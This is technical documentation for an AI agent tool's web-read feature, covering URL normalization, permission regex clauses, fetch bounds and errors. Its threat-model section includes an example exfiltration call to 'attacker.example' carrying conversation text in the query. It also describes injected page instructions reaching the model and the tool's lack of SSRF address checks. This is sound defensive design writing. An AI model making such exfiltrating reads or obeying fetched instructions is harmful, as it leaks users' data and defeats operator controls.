# Web reads

The native `read` tool accepts an absolute `http://` or `https://` locator and
fetches it with the API process's own outbound HTTP. A web read is the tool the
model already knows: the same trailing line selectors over the returned text,
the same result bound, and the same `read` permission group as a file read. No
web tool id, `tools.allowed` entry, configuration key, or advertisement
condition is added, and `edit` and `write` reject a web locator with
`invalid_path` before any request.

Deferred by design: address-level policy (#914), response snapshots and any
cache (#915), and PDF or image bodies (#916). See
[what is not read](#what-is-not-read).

## Enabling

`read` must be named in `tools.allowed`. It is advertised whenever it is
allowlisted, because a web locator needs no `tools.nativeExecutorId` and binds
no executor identity; an absolute path on a process without accepted native
authority still fails closed with `executor_unavailable` (see
[native files](native-files.md)).

Restriction and reach are the `read` group in `tools.permissions` — there is no
web-specific key:

```jsonc
{
  "tools": {
    "allowed": ["read"],
    "permissions": {
      "read": {
        "allow": true,
        "reject": [
          { "field": "path", "regex": "^http://" },
          {
            "field": "path",
            "regex": "^https?://([^/]*\\.)?grokipedia\\.com\\.?([/:]|$)",
          },
        ],
      },
    },
  },
}
```

The shipped example (`apps/api/llame.config.json.example`) keeps `read` open
with a whole-tool allow plus the credential-locator rejects F1-F4 and these two
web rejects: `^http://` (F5) refuses cleartext HTTP, so an operator who copies
the map keeps transport security, and the grokipedia clause (F6) refuses one
publisher's host, its subdomains, and a trailing-dot spelling. Both are
ordinary permission clauses over the submitted `path` text: rejects veto
allows, matching is case-sensitive, and a supplied map is the complete policy.
See [tool-call permissions](tool-call-permissions.md) for the clause grammar,
the decision order, and the pattern engine.

Only `http://` and `https://` are admitted. An unimplemented scheme, a
non-web URL, and userinfo all fail with `invalid_path` before any request, and
no credential from a locator is ever sent or echoed.

## Locator and selectors

`read({ path: "https://example.test/guide" })`. A trailing selector is split
off exactly as for `kb://` and `skill://`, and it addresses the returned text,
never the URL: `https://example.test/guide:10-20` fetches the page and returns
lines 10 through 20 of the rendered text with the ordinary context, range, and
truncation rules. The grammar is the shipped one — `raw`, `raw:N`, `raw:N-M`,
`N`, `N-M`, `N+K`, and comma-separated lists of those.

The URL is normalized to the text the request will use. An uppercase scheme
or host, a percent-encoded or Unicode host, an explicit default port, a host's
root dot, an empty path, an unencoded space, and a fragment are each
normalized rather than refused, and the result's `path` reports the locator
that was fetched:

| Submitted                            | Requested                     |
| ------------------------------------ | ----------------------------- |
| `HTTPS://Example.test/guide`         | `https://example.test/guide`  |
| `https://g%72okipedia.com/page`      | `https://grokipedia.com/page` |
| `https://example.test:443/guide`     | `https://example.test/guide`  |
| `https://example.test./guide`        | `https://example.test/guide`  |
| `https://example.test/a b`           | `https://example.test/a%20b`  |
| `https://example.test/guide#install` | `https://example.test/guide`  |

What no normalization can repair is still refused before any request, each
with the spelling that would work: a text that is not a URL, a scheme outside
`http` and `https`, a suffix outside the selector grammar, and userinfo
(`https://user:secret@example.test/x`), whose message never echoes the
credential.

Because the requested text is not always the submitted text, the permission
decision is taken over both. A reject clause matching either refuses the call,
so a reject naming `grokipedia.com` catches `https://g%72okipedia.com/page`,
`https://GROKIPEDIA.com/page`, `https://grokipedia.com:443/page`, and
`https://grokipedia.com./page` alike — and a clause naming `%72` catches the
encoded spelling itself. The allow is decided on the requested text, because
an allow names a resource and those spellings are one resource; a redirect hop
is a different resource, so it still earns its own allow.

A colon is read as a selector only after the path separator, which decides the
two readings of `:N`:

- `https://example.test:88` has no path, so its `88` is the port. It is
  requested as `https://example.test:88/` — the one spelling admitted that is
  not byte-identical to its serialization, because the empty path's slash
  addresses the same endpoint — and the permission decision matched that same
  text.
- `https://example.test/:88` is line 88 of the site root, and
  `https://example.test:88/:88` is line 88 served from port 88.
- `https://example.test:1-5` is not a URL at all: `1-5` sits where the port
  belongs. The refusal names `https://example.test/:1-5`, the same selector on
  the serialized authority, and `https://example.test:abc/` is answered with
  "a port must be a number" rather than the generic message.
- A literal colon in the last path segment is written `%3A`:
  `https://w.example/wiki/Special%3ASearch`, because
  `https://w.example/wiki/Special:Search` splits at the colon and `Search` is
  outside the grammar. `https://w.example/docs/2024:10` selects line 10 and
  `:10-20` lines 10 through 20 of `https://w.example/docs/2024`.
- A selector the render cannot serve — past the end, or empty — fails as
  `invalid_selector` reporting how many lines the page rendered, which is the
  one fact the model could not know before reading it.

A fragment is cut before anything else reads the locator, because the request
drops it anyway: `https://example.test/guide#install` is fetched as
`https://example.test/guide`, and that fragment-free text is what a permission
clause matched. Free text inside a fragment therefore cannot satisfy a clause
the requested URL does not — an allow written for `/docs/` does not admit
`https://evil.test/x#/docs/`.

A trailing separator stays inside the URL: `https://example.test/guide/` is
fetched as written and is never read as a directory request.

## Adapter order

Each successful read reports `method`, the adapter that produced the content.
The result is otherwise the native read object — `content`, the requested and
shown range or ranges, `nextOffset`, `truncated`, and `path` as the locator
with its selector stripped — plus `finalUrl` and `notes` only when there is
something to report; there is no `url`, `contentType`, `markdownTokens`,
`realPath`, text header, or frontmatter block. The order is:

| `method`      | Source of the content                                                                                           |
| ------------- | --------------------------------------------------------------------------------------------------------------- |
| `negotiated`  | the first response itself: `text/markdown`, or `text/plain` that does not open an HTML document                 |
| `alternate`   | a Markdown URL announced by a `Link` header or a head `<link rel="alternate" type="text/markdown">`             |
| `md-suffix`   | the publisher's `.md` suffix probe: `/a/b.html` → `/a/b.html.md`, `/a/b` → `/a/b.md`, `/a/b/` → `/a/b/index.md` |
| `readability` | local extraction and conversion of the HTML body                                                                |
| `llms-txt`    | an `llms.txt` index reached from the deepest path segment up to the site root                                   |
| `text`        | a JSON, XML, or other `text/*` body, returned unchanged                                                         |
| `raw`         | the response body unchanged, with a note; also `:raw` and a detected challenge page                             |

Every request, probes included, carries
`Accept: text/markdown, text/plain;q=0.9, text/html;q=0.8, */*;q=0.5` and the
same `User-Agent: llame/<version>`, taken from the boot-time instance-config
value. A publisher that serves Markdown or plain text for agents is therefore
used without a second request and without a local conversion.

The first candidate that passes the quality gate wins and ends the search. The
gate requires more than 100 non-whitespace characters, requires a Markdown
candidate not to be HTML-shaped, and rejects a low-quality body: under 1,024
characters and containing a JavaScript or captcha phrase, or more than 70
percent of its non-blank lines shorter than 40 characters while fewer than 40
lines reach that length. The second clause is what keeps a reference page —
the CommonMark spec renders 6,821 lines, 88 percent of them short — out of the
raw fallback: a render with 40 substantial lines is a document whatever its
shape, and the raw HTML of the same page is never the better answer. An
`llms.txt`
candidate is judged on length and shape only, because an index file is short
link lines by construction. `readability` is Readability's main-content
extraction converted to Markdown with GFM tables, and it converts the whole
body when Readability finds no article. The render opens with the page's title
as a heading, because Readability strips it as the article's own heading —
without it `https://example.com/` rendered three lines that never named the
page. A candidate that fails the gate never
becomes the content, and a fetched candidate is not searched for further
alternates or suffixes.

A probe answers for itself only: its non-2xx status, a content type the read
refuses, an oversized body, a headers timeout, an unfollowable redirect, a
transport failure, a refusal inside its own redirect chain, or a failed gate
disqualifies that candidate and the pipeline continues, because the suffix
probe and the `llms.txt` walk expect 404 as their ordinary answer. From every
probe, only the call's own spent bounds — its 30-second deadline and its
20-hop budget — and the caller's abort end the read; a refused hop on the
call's own request chain ends it too, and reports the refused target. One call
issues at most one alternate request, one suffix probe, and four `llms.txt`
candidates; with 20 redirects that is at most 27 requests.

## Derived locators and permission admission

A web read derives locators the model never wrote: redirect hops, an announced
alternate, a suffix candidate, and `llms.txt` candidates. Each one is evaluated
against the `read` permission group before its request, as if the model had
submitted it, through the same evaluator and the same projection the call used.
It inherits nothing from the admitted call or from an earlier derived locator.

The two forms policy sees differ, and the difference matters when you write
clauses:

- A locator is matched twice: as the model submitted it, and as the read tool
  parses it — fragment cut, host, port, and encoding normalized, selector
  kept. A reject matching either refuses the call; the allow is decided on the
  parsed text, which is the one the request uses.
- A hop locator is the `Location` value resolved against the redirecting
  request's URL and serialized by the WHATWG parser as its `href`, with any
  fragment dropped: lowercase host, an internationalized host as punycode, a
  default port dropped, an empty path as `/`, and path and query
  percent-encoded. Write hop-relevant rules against that form, not against the
  spelling the server happened to send.

Redirects are followed on any host for 301, 302, 303, 307, and 308. A redirect
status without a parsable `Location`, or a hop carrying userinfo or a non-web
scheme, fails with `invalid_redirect` before any request to that target, and
the error never names it; on the call's own request it ends the read, while a
probe's own redirect disqualifies only that candidate. A fragment is dropped
rather than refused, before admission and before the request, so the text
policy matches is exactly the URL the request fetches — which matters when a
clause is anchored on the locator's exact end, as in the recipe below.

A rejected hop ends the call: the model sees `permission_denied` with a fixed
message that carries no interpolation, and the result's `rejectedUrl` carries
the refused locator's origin and path only — query and fragment removed, so a
signed query string in a `Location` never reaches the model — bounded to 2,048
characters with control characters removed. The refused target's body is never
read. A rejected probe locator, by contrast, only disqualifies its candidate,
so a hostile page cannot make a read of itself fail by announcing a refused
alternate.

Every derived-locator decision is recorded privately, beside the call decision,
when the call settles: owner-scoped tool activity and the stored tool part
carry the decision, its static reason, a bounded clause reference, and the same
policy-instance ID the call decision carries. The record never travels through
the model-visible result, and it stays excluded from model replay, public
shares, exports, and search. The result itself reports only `finalUrl`; no hop
chain is exposed.

## Restricting reads to one domain

Replacing the group's whole-tool allow with field allows turns `read` into an
allowlist of authorities. Each clause is an alternative, not a combined
constraint, so local paths, Knowledge locators, skill locators, and one domain
coexist:

```jsonc
{
  "tools": {
    "permissions": {
      "read": {
        "allow": [
          { "field": "path", "regex": "^/" },
          { "field": "path", "regex": "^kb://" },
          { "field": "path", "regex": "^skill://" },
          { "field": "path", "regex": "^https://docs\\.example\\.com/" },
        ],
      },
    },
  },
}
```

With that group, reading `https://docs.example.com/guide` is admitted, and
reading `https://other.example/guide`, `/etc/hosts`, or `kb://SPACE/notes/a.md`
is each rejected as `no_allow` without a fetch or a file open.

What the clause matches is locator text, not an address:

- A `kb://` locator is projected before matching (selector removed, path
  re-encoded); a web locator is matched as submitted, selector included, so
  `^https://docs\.example\.com/` still admits `.../guide:raw`.
- A noncanonical submitted spelling matches no such clause: `HTTPS://docs.example.com/guide`
  is rejected as `no_allow`, and under a whole-tool allow the same call reaches
  the tool, which refuses it as `invalid_path`. Either way no request is issued.
- The clause admits a hostname, never the address that name resolves to, and a
  trailing-dot host is a different text: `https://docs.example.com./` does not
  match `^https://docs\.example\.com/` even though it resolves to the same
  server. A host rule that must cover both spellings tolerates the dot, as the
  recommended grokipedia clause does with its `\.?`.

## Threat model

**Fetched text is untrusted input.** The tool neutralizes nothing and adds no
notice around fetched content, so a page's instructions reach the model with
the standing of any other tool output. The model can be told to read a URL by
anything it already has, including a Knowledge file or a page it read earlier;
the `read` group is the only boundary.

**A URL is an outbound channel.** A GET's path and query are model-authored, so
under a whole-tool allow `read https://attacker.example/?d=<conversation text>`
is one admitted call that carries data out of the process. The operator's
`read` group bounds that direction too; a domain allowlist (above) is the
mitigation, and it is only as good as the canonical text it matches.

**No address is inspected.** The tool does not resolve a hostname or check an
address before connecting: there is no loopback, private-range, link-local,
ULA, or cloud-metadata check, and a redirect chain reaches those addresses the
same way. A name that resolves to `127.0.0.1`, a private range, or a metadata
service passes any clause that admits its text, and an answer that changes
between the decision and the connection passes too. Issue #914 owns address
evaluation; until it ships, a `path` clause over text is the only barrier, so
keep the `read` group tight.

**Publisher signals are not permission.** `robots.txt` and `content-signal` are
neither consulted nor reported, and an admitted read is not presented as the
publisher's consent. An operator who wants a preference respected writes a
`path` reject for the host — the shipped grokipedia clause is that pattern.
llame does not rotate its `User-Agent`, impersonate a browser, or circumvent a
challenge; a challenge page is reported in a note instead.

## Bounds

| Bound                         | Value                                                                            |
| ----------------------------- | -------------------------------------------------------------------------------- |
| Response headers              | 10 s per request (`headers_timeout`)                                             |
| The whole call, every request | 30 s (`call_timeout`)                                                            |
| Response body                 | 5 MiB streamed (`body_too_large`)                                                |
| Redirects per call            | 20 (`too_many_redirects`)                                                        |
| Requests per call             | 27: first, 20 hops, one alternate, one suffix probe, four `llms.txt`             |
| Retries                       | none: no request is repeated, and a probe's failure disqualifies its candidate   |
| Charset                       | `Content-Type` parameter, else a `<meta charset>` in the first 2 KiB, else UTF-8 |
| Read result                   | the native bound: 16,000 UTF-16 code units, with the web fields reserved first   |
| Request credentials           | none: no cookie, `Authorization`, or other credential on any request             |

A declared body length above the cap fails before the body is read, and a
streaming body is aborted at the first chunk past the cap instead of being
buffered. `Accept-Encoding` is left to the runtime; every request of a call
counts against the same 30-second deadline, while the 10-second wait for
headers and the 5 MiB body cap are each request's own.

Line selectors apply to the rendered text under the native rules: the
2,000-line default window, context lines, merged ranges, `nextOffset`, and
`truncated` all behave as for a local file (see
[native files](native-files.md)).

## Errors

| Error type                 | Meaning                                                                                                                                                    |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `invalid_path`             | the locator is not an absolute web URL, has a port that is not a number, carries userinfo, or targets `edit` or `write`                                    |
| `invalid_selector`         | the split-off suffix is outside the shipped selector grammar, such as an unencoded colon in the last segment                                               |
| `executor_unavailable`     | instance configuration resolved no boot-time version for `User-Agent: llame/<version>`                                                                     |
| `headers_timeout`          | no response headers arrived within 10 seconds                                                                                                              |
| `call_timeout`             | the call passed 30 seconds across its requests                                                                                                             |
| `body_too_large`           | the body declared or streamed more than 5 MiB                                                                                                              |
| `http_status`              | a non-2xx, non-redirect status on the first response or a hop; a 429 also carries `Retry-After`, and the body is not returned                              |
| `unsupported_content_type` | the response is not a text body, or declares no content type                                                                                               |
| `invalid_redirect`         | a redirect status without a parsable `Location`, or a hop with userinfo or a non-web scheme; the target is never named; a fragment is dropped, not refused |
| `too_many_redirects`       | the call exceeded 20 redirects                                                                                                                             |
| `permission_denied`        | the `read` group refused the submitted locator, or refused a hop — a hop rejection carries `rejectedUrl`                                                   |
| `aborted`                  | the Run or the caller cancelled the read                                                                                                                   |
| `network_error`            | the transport failed (DNS, TLS, connection reset); a probe's failure disqualifies only its candidate, and no request is retried                            |

Failures never return partial content: the model sees the error and can
continue with other work. Only a submitted locator or a redirect hop can fail a
whole call on permissions; a refused probe only disqualifies its candidate.

## What is not read

- **PDF, images, and every other non-text body.** They fail
  `unsupported_content_type` naming the received type, and no extraction or
  conversion is attempted. #916 decides whether documents earn their own path.
- **A cache or a snapshot.** Nothing is stored between calls, so a selector
  read refetches and rerenders, and reading one locator twice issues two
  requests whose content may differ. #915 owns snapshots.
- **Publisher signals.** `robots.txt` and `content-signal` are neither
  consulted nor reported.

## Troubleshooting

| Symptom                                             | Check                                                                                                                                       |
| --------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `permission_denied` with `rejectedUrl`              | a redirect hop was refused; allow that origin's canonical text, or drop the reject that matched                                             |
| `permission_denied` without `rejectedUrl`           | the submitted locator matched a reject or no allow; check the group's `path` clauses against the exact locator                              |
| `invalid_path` naming a spelling                    | the locator is not a URL; resubmit exactly the spelling the message names                                                                   |
| `invalid_selector` naming a `%3A` spelling          | the last path segment holds a literal colon; use the suggested encoded locator or a real selector                                           |
| `unsupported_content_type` naming `application/pdf` | document reads are not implemented (#916)                                                                                                   |
| `http_status` 403, or `raw` with a challenge note   | the publisher blocked the client; llame does not rotate its user agent or solve challenges                                                  |
| `headers_timeout` or `body_too_large`               | that candidate exceeded a bound; a probe is disqualified and the pipeline continues, while the page's own response ends the call            |
| `call_timeout`                                      | the call spent its 30-second budget across its requests; the read is not retried, so point the model at a smaller source                    |
| More requests than expected                         | a page with no publisher Markdown costs an alternate, a suffix probe, a render, and sometimes an `llms.txt` walk; `method` names the winner |
